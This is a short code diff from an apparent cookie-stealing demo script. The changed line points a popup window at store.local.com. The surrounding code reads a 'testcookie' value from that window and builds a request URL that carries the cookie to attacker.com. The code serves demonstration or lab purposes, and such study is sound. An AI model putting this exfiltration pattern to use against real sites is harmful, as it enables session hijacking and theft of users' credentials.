@@ -7,7 +7,7 @@ function get_cookie ( doc, cookie_name ) {
   return '' ;
 }
 
-var windowReference = window.open('http://local.com:5000', 'newindow');
+var windowReference = window.open('http://store.local.com:5000', 'newindow');
 var caputuredCookie = get_cookie(windowReference.document, 'testcookie');
 var requrl = "http://attacker.com:5000/attack?cookie=" + caputuredCookie;
 console.log(requrl);
